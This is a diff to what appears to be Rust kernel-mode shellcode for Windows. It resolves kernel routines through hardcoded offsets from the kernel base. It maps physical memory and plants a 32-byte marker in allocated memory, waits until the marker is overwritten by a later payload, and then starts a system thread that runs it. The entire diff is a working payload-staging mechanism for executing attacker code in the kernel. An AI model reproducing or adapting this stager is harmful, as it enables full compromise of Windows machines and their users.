@@ -26,35 +26,59 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
 		out(reg) nt_base
 	);
 
+    /*
     let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");
     let ke_initialize_timer: ntdef::functions::KeInitializeTimer = ntproc::find!("KeInitializeTimer");
     let ke_initialize_dpc: ntdef::functions::KeInitializeDpc = ntproc::find!("KeInitializeDpc");
     let ke_set_timer_ex: ntdef::functions::KeSetTimerEx = ntproc::find!("KeSetTimerEx");
-    /*
-    let ex_initialize_fast_mutex: ntdef::functions::ExInitializeFastMutex = ntproc::find!("ExInitializeFastMutex");
-    let ex_try_to_acquire_fast_mutex: ntdef::functions::ExTryToAcquireFastMutex = ntproc::find!("ExTryToAcquireFastMutex");
-    */
     let mm_allocate_contiguous_memory: ntdef::functions::MmAllocateContiguousMemory = ntproc::find!("MmAllocateContiguousMemory");
     let mm_map_io_space: ntdef::functions::MmMapIoSpace = ntproc::find!("MmMapIoSpace");
+    */
+
+    let mm_allocate_contiguous_memory: ntdef::functions::MmAllocateContiguousMemory;
+    let mm_map_io_space: ntdef::functions::MmMapIoSpace;
+    let ps_create_system_thread: ntdef::functions::PsCreateSystemThread;
+    asm!(
+        "mov {1}, {0}",
+        "add {1}, 0x52c980",
+        in(reg) nt_base,
+        out(reg) mm_allocate_contiguous_memory
+    );
+    asm!(
+        "mov {1}, {0}",
+        "add {1}, 0x318320",
+        in(reg) nt_base,
+        out(reg) mm_map_io_space
+    );
+    asm!(
+        "mov {1}, {0}",
+        "add {1}, 0x6428f0",
+        in(reg) nt_base,
+        out(reg) ps_create_system_thread
+    );
 
     let mutex_phys = mm_map_io_space(0 as _, 128, ntdef::enums::MmNonCached);
-    /*
-    let _ = ex_initialize_fast_mutex(mutex_phys);
-    let acquired = ex_try_to_acquire_fast_mutex(mutex_phys);
-    */
     let acquired = try_to_acquire_fast(mutex_phys as _);
     if acquired == 1 as _ {
-        let timer = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 128);
-        let _ = ke_initialize_timer(timer);
-        let dpc = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 128);
         let deferred_routine = mm_allocate_contiguous_memory(16384, 0xFFFFFFFFFFFFFFFF);
-        let egg = [0xccu8, 0xc3u8]; // int 3; ret
-        let _ = ntdef::macros::RtlCopyMemory(deferred_routine as _, &egg as _, 2);
-        let params = ntdef::enums::NULL;
-        let _ = ke_initialize_dpc(dpc, deferred_routine, params);
-        let due_time: ntdef::types::LARGE_INTEGER = -10000000 * 180; // 180 seconds
-        let period: ntdef::types::LONG = 0; // non-periodic
-        let _ = ke_set_timer_ex(timer, due_time, period, dpc);
+        // let egg = [0xccu8, 0xc3u8]; // int 3; ret
+        let egg = [0x30u8, 0xf7u8, 0x97u8, 0x46u8, 0x70u8, 0x55u8, 0x47u8, 0xe3u8, 0xa6u8, 0x25u8, 0xb8u8, 0x2du8, 0xccu8, 0xabu8, 0x2fu8, 0x3eu8, 0x56u8, 0x0au8, 0x71u8, 0x00u8, 0x98u8, 0xe4u8, 0x4du8, 0xa7u8, 0x98u8, 0x1du8, 0x45u8, 0xf0u8, 0xafu8, 0x83u8, 0x50u8, 0x6du8];
+        let _ = ntdef::macros::RtlCopyMemory(deferred_routine as _, &egg as _, 32);
+        let mut still_egg: u32 = ntdef::macros::RtlEqualMemory(deferred_routine as _, &egg as _, 32);
+        while still_egg == 1 as _ {
+            still_egg = ntdef::macros::RtlEqualMemory(deferred_routine as _, &egg as _, 32);
+        }
+        /*
+        // let _ = deferred_routine();  // compiler error
+        asm!(
+            "call {0}",
+            in(reg) deferred_routine
+        );
+        */
+        // no need for ExAllocatePool here
+        let mut thread_handle = mm_allocate_contiguous_memory(128, 0xFFFFFFFFFFFFFFFF); 
+        let _ = ps_create_system_thread(&mut thread_handle as _, ntdef::enums::THREAD_ALL_ACCESS,
+            ntdef::enums::NULL, ntdef::enums::NULL, ntdef::enums::NULL, deferred_routine as _, ntdef::enums::NULL);
     }
 
     Ok(())
